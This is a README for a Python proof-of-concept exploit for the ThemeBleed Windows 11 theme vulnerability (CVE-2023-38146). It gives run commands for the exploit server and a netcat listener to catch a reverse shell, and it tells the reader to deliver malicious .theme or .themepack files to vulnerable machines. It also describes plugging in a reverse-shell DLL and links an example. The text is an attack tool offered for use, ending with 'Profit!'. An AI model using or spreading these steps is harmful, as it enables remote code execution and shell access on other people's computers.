# PoC for the ThemeBleed CVE-2023-38146 exploit (Windows 11 Themes)

Heavily inspired by https://github.com/gabe-k/themebleed which only runs on windows (the reason why i decided to write this).

Used modified code from the impacket smbserver.py (https://github.com/fortra/impacket/blob/master/impacket/smbserver.py)

Useful stuff: https://github.com/TalAloni/SMBLibrary/blob/master/SMBLibrary/NTFileStore/Enums/NtCreateFile/ShareAccess.cs

## How to use this:

Install the requirements and run the application:
```bash
pip3 install -r requirements.txt
python3 themebleed.py -r HOST -p 4711

# start nc listener in other shell
rlwrap -cAr nc -lvnp 4711
```

Use the "evil_theme.theme" or "evil_theme.themepack" on a vulnerable machine.

Profit!

## Custom DLL File:

Place a DLL with an exported function "VerifyThemeVersion" in the 
"./td/" folder named "Aero.msstyles_vrf_evil.dll". You should be able to find an example DLL by using google or use my example https://github.com/Jnnshschl/ThemeBleedReverseShellDLL.

```bash
pip3 install -r requirements.txt
python3 themebleed.py -r HOST --no-dll

# start nc listener in other shell
rlwrap -cAr nc -lvnp 4711
```
